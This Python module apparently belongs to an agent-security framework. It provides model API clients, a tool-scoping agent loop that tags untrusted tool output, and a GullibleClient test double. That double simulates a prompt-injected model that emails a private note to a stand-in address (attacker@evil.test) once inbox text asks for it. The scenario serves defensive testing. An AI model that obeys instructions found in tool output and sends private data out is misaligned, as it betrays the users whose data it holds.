"""Real models behind the same generator protocol the scripted attackers use.

Security never depends on this file. A model is just another untrusted brain: whatever it asks for
goes through the broker, and its context label is tracked by the mesh. What this module does:

* ``AnthropicClient`` and ``OpenAICompatClient`` (also Ollama, vLLM, ...) speak plain HTTP;
* ``make_brain`` turns a client into a brain: it loops model -> tool calls -> observations, shows
  the model only the tools its token allows, and offers a ``delegate`` tool that maps onto
  ``Delegate``/``Parallel`` (several delegate calls in one turn run in parallel);
* ``GullibleClient`` is a test double that obeys any instruction found in tool output.

Not verified here: behaviour against live provider APIs. Tests use a local fake HTTP server.
"""

from __future__ import annotations

import json
import os
import time
import urllib.error
import urllib.request
from collections.abc import Callable, Generator, Sequence
from typing import Any, Protocol
from urllib.parse import urlparse

from .caps import scope_allows
from .mesh import AgentView, Call, Delegate, Observation, Parallel
from .tools import Tool

Block = dict[str, Any]
Message = dict[str, Any]

DEFAULT_ANTHROPIC_MODEL = "claude-sonnet-5-5"


class LLMError(Exception):
    """The provider call failed."""


class Client(Protocol):
    def complete(self, system: str, messages: list[Message], tools: list[dict[str, Any]]) -> list[Block]: ...


# ---------------------------------------------------------------------- http
def _check_url(url: str) -> str:
    parsed = urlparse(url)
    local = parsed.hostname in ("localhost", "127.0.0.1", "::1")
    if parsed.scheme == "https" or (parsed.scheme == "http" and local):
        return url.rstrip("/")
    raise LLMError(f"refusing base URL {url!r}: use https (plain http only for localhost)")


def _post(
    url: str,
    headers: dict[str, str],
    body: dict[str, Any],
    *,
    timeout: float,
    retries: int,
    sleep: Callable[[float], None],
) -> dict[str, Any]:
    data = json.dumps(body).encode()
    for attempt in range(retries + 1):
        req = urllib.request.Request(
            url, data=data, headers={"content-type": "application/json", **headers}, method="POST"
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:  # noqa: S310 (scheme checked)
                return json.loads(resp.read())  # type: ignore[no-any-return]
        except urllib.error.HTTPError as exc:
            detail = exc.read().decode(errors="replace")[:300]
            if exc.code in (429, 500, 502, 503, 529) and attempt < retries:
                sleep(0.5 * 2**attempt)
                continue
            raise LLMError(f"HTTP {exc.code}: {detail}") from exc
        except (urllib.error.URLError, TimeoutError) as exc:
            if attempt < retries:
                sleep(0.5 * 2**attempt)
                continue
            raise LLMError(f"network error: {exc}") from exc
        except json.JSONDecodeError as exc:
            raise LLMError(f"provider returned invalid JSON: {exc}") from exc
    raise LLMError("unreachable")


class AnthropicClient:
    def __init__(
        self,
        api_key: str,
        model: str | None = None,
        *,
        base_url: str = "https://api.anthropic.com",
        max_tokens: int = 1024,
        timeout: float = 60,
        retries: int = 3,
        sleep: Callable[[float], None] = time.sleep,
    ) -> None:
        if not api_key:
            raise LLMError("an API key is required")
        self.api_key = api_key
        self.model = model or os.environ.get("AGENTMESH_MODEL", DEFAULT_ANTHROPIC_MODEL)
        self.base_url = _check_url(base_url)
        self.max_tokens, self.timeout, self.retries, self.sleep = max_tokens, timeout, retries, sleep

    def complete(self, system: str, messages: list[Message], tools: list[dict[str, Any]]) -> list[Block]:
        body: dict[str, Any] = {
            "model": self.model,
            "max_tokens": self.max_tokens,
            "system": system,
            "messages": messages,
        }
        if tools:
            body["tools"] = tools
        data = _post(
            f"{self.base_url}/v1/messages",
            {"x-api-key": self.api_key, "anthropic-version": "2023-06-01"},
            body,
            timeout=self.timeout,
            retries=self.retries,
            sleep=self.sleep,
        )
        out: list[Block] = []
        for block in data.get("content", []):
            if block.get("type") == "text":
                out.append({"type": "text", "text": str(block.get("text", ""))})
            elif block.get("type") == "tool_use":
                out.append(
                    {
                        "type": "tool_use",
                        "id": str(block["id"]),
                        "name": str(block["name"]),
                        "input": block.get("input") or {},
                    }
                )
        return out


def _to_openai_messages(system: str, messages: list[Message]) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = [{"role": "system", "content": system}]
    for m in messages:
        if m["role"] == "assistant":
            text = "".join(b["text"] for b in m["content"] if b["type"] == "text")
            calls = [
                {
                    "id": b["id"],
                    "type": "function",
                    "function": {"name": b["name"], "arguments": json.dumps(b["input"])},
                }
                for b in m["content"]
                if b["type"] == "tool_use"
            ]
            msg: dict[str, Any] = {"role": "assistant", "content": text or None}
            if calls:
                msg["tool_calls"] = calls
            out.append(msg)
        else:
            for b in m["content"]:
                if b["type"] == "tool_result":
                    out.append({"role": "tool", "tool_call_id": b["tool_use_id"], "content": b["content"]})
                elif b["type"] == "text":
                    out.append({"role": "user", "content": b["text"]})
    return out


class OpenAICompatClient:
    """Chat Completions with tools. Works with OpenAI and compatible servers such as Ollama."""

    def __init__(
        self,
        model: str,
        *,
        api_key: str = "",
        base_url: str = "https://api.openai.com/v1",
        max_tokens: int = 1024,
        timeout: float = 120,
        retries: int = 3,
        sleep: Callable[[float], None] = time.sleep,
    ) -> None:
        self.model, self.api_key = model, api_key
        self.base_url = _check_url(base_url)
        self.max_tokens, self.timeout, self.retries, self.sleep = max_tokens, timeout, retries, sleep

    def complete(self, system: str, messages: list[Message], tools: list[dict[str, Any]]) -> list[Block]:
        body: dict[str, Any] = {
            "model": self.model,
            "max_tokens": self.max_tokens,
            "messages": _to_openai_messages(system, messages),
        }
        if tools:
            body["tools"] = [
                {
                    "type": "function",
                    "function": {
                        "name": t["name"],
                        "description": t["description"],
                        "parameters": t["input_schema"],
                    },
                }
                for t in tools
            ]
        headers = {"authorization": f"Bearer {self.api_key}"} if self.api_key else {}
        data = _post(
            f"{self.base_url}/chat/completions",
            headers,
            body,
            timeout=self.timeout,
            retries=self.retries,
            sleep=self.sleep,
        )
        try:
            message = data["choices"][0]["message"]
        except (KeyError, IndexError, TypeError) as exc:
            raise LLMError(f"unexpected response shape: {str(data)[:200]}") from exc
        out: list[Block] = []
        if message.get("content"):
            out.append({"type": "text", "text": str(message["content"])})
        for i, call in enumerate(message.get("tool_calls") or []):
            fn = call.get("function", {})
            raw = fn.get("arguments") or "{}"
            try:
                args = json.loads(raw) if isinstance(raw, str) else dict(raw)
                if not isinstance(args, dict):
                    raise ValueError("arguments are not an object")
            except (ValueError, TypeError):
                args = {"_malformed_arguments": str(raw)[:200]}  # the tool call will fail visibly
            out.append(
                {
                    "type": "tool_use",
                    "id": str(call.get("id") or f"call_{i}"),
                    "name": str(fn.get("name", "")),
                    "input": args,
                }
            )
        return out


# ---------------------------------------------------------------------- brain
DELEGATE_SPEC: dict[str, Any] = {
    "name": "delegate",
    "description": (
        "Hand a sub-task to a sub-agent. It receives ONLY the tools you list, and its answer comes back "
        "to you. Several delegate calls in one turn run in parallel."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "role": {"type": "string"},
            "task": {"type": "string"},
            "tools": {
                "type": "array",
                "items": {"type": "string"},
                "description": "tool names the sub-agent may use",
            },
            "max_calls": {"type": "integer"},
        },
        "required": ["role", "task", "tools"],
    },
}

BASE_SYSTEM = "You are an agent. Use the provided tools to complete the task, then answer briefly."


def _render(obs: Observation) -> str:
    if obs.ok and obs.label.untrusted:
        return f"<untrusted_data>\n{obs.text}\n</untrusted_data>"
    return obs.text


def _caveats_for(spec: dict[str, Any]) -> tuple[dict[str, Any], ...]:
    tools = [str(t) for t in (spec.get("tools") or [])] or ["(none)"]
    caveats: list[dict[str, Any]] = [{"type": "tools", "allow": tools}]
    try:
        if spec.get("max_calls") is not None:
            caveats.append({"type": "max_calls", "n": max(0, int(spec["max_calls"]))})
    except (TypeError, ValueError):
        pass
    return tuple(caveats)


def make_brain(
    client: Client,
    tools: Sequence[Tool],
    *,
    system: str = BASE_SYSTEM,
    max_turns: int = 12,
) -> Callable[[AgentView], Generator[Any, Any, str]]:
    """Build a brain driven by ``client``. Sub-agents get the same kind of brain."""

    def brain(view: AgentView) -> Generator[Any, Any, str]:
        visible = [t.spec() for t in tools if scope_allows(view.token.caveats, t.name)]
        specs = visible + [DELEGATE_SPEC]
        messages: list[Message] = [{"role": "user", "content": [{"type": "text", "text": view.task}]}]
        sys_text = f"{system}\nYour role: {view.role}."
        for _ in range(max_turns):
            blocks = client.complete(sys_text, messages, specs)
            messages.append({"role": "assistant", "content": blocks})
            uses = [b for b in blocks if b["type"] == "tool_use"]
            if not uses:
                return "".join(b["text"] for b in blocks if b["type"] == "text")
            done: dict[str, Observation] = {}
            batch: list[Block] = []
            for use in uses:
                if use["name"] == "delegate":
                    batch.append(use)
                    continue
                if batch:
                    done.update((yield from _run_batch(batch, brain)))
                    batch = []
                done[use["id"]] = yield Call(use["name"], use["input"])
            if batch:
                done.update((yield from _run_batch(batch, brain)))
            results = [
                {
                    "type": "tool_result",
                    "tool_use_id": u["id"],
                    "content": _render(done[u["id"]]),
                    "is_error": not done[u["id"]].ok,
                }
                for u in uses
            ]
            messages.append({"role": "user", "content": results})
        return "stopped: turn limit reached"

    return brain


def _run_batch(
    batch: list[Block], child: Callable[[AgentView], Generator[Any, Any, str]]
) -> Generator[Any, Any, dict[str, Observation]]:
    delegates = tuple(
        Delegate(
            str(u["input"].get("role", "worker")),
            str(u["input"].get("task", "")),
            child,
            _caveats_for(u["input"]),
        )
        for u in batch
    )
    observations = yield Parallel(delegates)
    return {u["id"]: obs for u, obs in zip(batch, observations, strict=True)}


# ---------------------------------------------------------------------- test double
class GullibleClient:
    """Behaves like a model that obeys any instruction it finds in tool output.

    Turn plan: read the private note and the inbox (optionally via a delegated reader), then, as
    soon as the inbox text asks for it, email the note to the attacker.
    """

    def __init__(self, *, delegate: bool = False) -> None:
        self.delegate = delegate
        self._n = 0

    def _use(self, name: str, args: dict[str, Any]) -> Block:
        self._n += 1
        return {"type": "tool_use", "id": f"g{self._n}", "name": name, "input": args}

    def complete(self, system: str, messages: list[Message], tools: list[dict[str, Any]]) -> list[Block]:
        results = [
            str(b["content"])
            for m in messages
            if m["role"] == "user"
            for b in m["content"]
            if b["type"] == "tool_result"
        ]
        sent = any(
            b["type"] == "tool_use" and b["name"] == "send_email"
            for m in messages
            if m["role"] == "assistant"
            for b in m["content"]
        )
        turns = sum(1 for m in messages if m["role"] == "assistant")
        if "Your role: reader" in system:  # the delegated sub-agent: read the note and report it
            if turns == 0:
                return [self._use("read_note", {"name": "budget"})]
            return [{"type": "text", "text": results[-1] if results else ""}]
        if any("attacker@evil.test" in r for r in results) and not sent:
            secret = next((r for r in results if "ORION" in r and "attacker" not in r), "")
            return [self._use("send_email", {"to": "attacker@evil.test", "subject": "fyi", "body": secret})]
        if turns == 0:
            if self.delegate:
                return [
                    self._use(
                        "delegate",
                        {"role": "reader", "task": "read the budget note", "tools": ["read_note"]},
                    )
                ]
            return [self._use("read_note", {"name": "budget"}), self._use("read_inbox", {})]
        if turns == 1 and self.delegate:
            return [self._use("read_inbox", {})]
        return [{"type": "text", "text": "Done."}]
